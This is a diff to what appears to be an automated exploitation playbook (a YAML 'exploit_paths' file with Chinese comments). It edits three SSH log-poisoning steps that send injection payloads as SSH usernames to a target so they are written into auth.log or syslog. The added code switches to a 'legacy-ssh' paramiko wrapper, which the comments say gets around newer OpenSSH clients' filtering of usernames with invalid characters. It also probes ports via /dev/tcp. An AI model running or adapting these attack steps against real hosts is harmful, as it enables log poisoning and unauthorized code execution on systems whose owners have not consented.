@@ -477,6 +477,9 @@ exploit_paths:
              || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
             SSH_PORT=22
           fi
+          # 优先使用 legacy-ssh（paramiko wrapper，见 docker/toolbox/fix_ssh_legacy.sh），
+          # 以绕开新版 openssh 客户端对 "invalid characters" 用户名的本地过滤
+          SSH_BIN=$(command -v /usr/local/bin/legacy-ssh 2>/dev/null || echo ssh)
           echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
 
           # 先快速确认 SSH 端口真的可达，避免空打日志注入浪费时间
@@ -491,7 +494,7 @@ exploit_paths:
             [ -z "$P" ] && continue
             echo "[POISON] trying payload: ${P} (len=${#P})"
             [ -z "$SSH_UNREACHABLE" ] && \
-              SSH_ERR=$(sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+              SSH_ERR=$(sshpass -p "x" "$SSH_BIN" -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                 -p "$SSH_PORT" "$P"@{TARGET_IP} 2>&1 || true) && \
               echo "$SSH_ERR" | head -2
             # OpenSSH 拒绝含特殊字符的用户名 → 回落到 banner 投毒（进 syslog/messages）
@@ -701,12 +704,15 @@ exploit_paths:
              || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
             SSH_PORT=22
           fi
+          # 优先使用 legacy-ssh（paramiko wrapper，见 docker/toolbox/fix_ssh_legacy.sh），
+          # 以绕开新版 openssh 客户端对 "invalid characters" 用户名的本地过滤
+          SSH_BIN=$(command -v /usr/local/bin/legacy-ssh 2>/dev/null || echo ssh)
           echo "[INFO] SSH poison target: {TARGET_IP}:$SSH_PORT"
 
           # SSH 投毒（命中率低，但 auth.log 投毒是为数不多可行的机会）
           if (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT") 2>/dev/null; then
             exec 3>&- 3<&- 2>/dev/null || true
-            sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+            sshpass -p "x" "$SSH_BIN" -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
               -p "$SSH_PORT" "$PAYLOAD"@{TARGET_IP} 2>&1 | head -2 || true
           fi
           sleep 2
@@ -868,9 +874,12 @@ exploit_paths:
              || ! echo "$SSH_PORT" | grep -Eq '^[0-9]+$'; then
             SSH_PORT=22
           fi
+          # 优先使用 legacy-ssh（paramiko wrapper，见 docker/toolbox/fix_ssh_legacy.sh），
+          # 以绕开新版 openssh 客户端对 "invalid characters" 用户名的本地过滤
+          SSH_BIN=$(command -v /usr/local/bin/legacy-ssh 2>/dev/null || echo ssh)
           if (exec 3<>/dev/tcp/{TARGET_IP}/"$SSH_PORT") 2>/dev/null; then
             exec 3>&- 3<&- 2>/dev/null || true
-            sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+            sshpass -p "x" "$SSH_BIN" -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
               -p "$SSH_PORT" "$PAYLOAD"@{TARGET_IP} 2>&1 | head -2 || true
           fi
           sleep 2
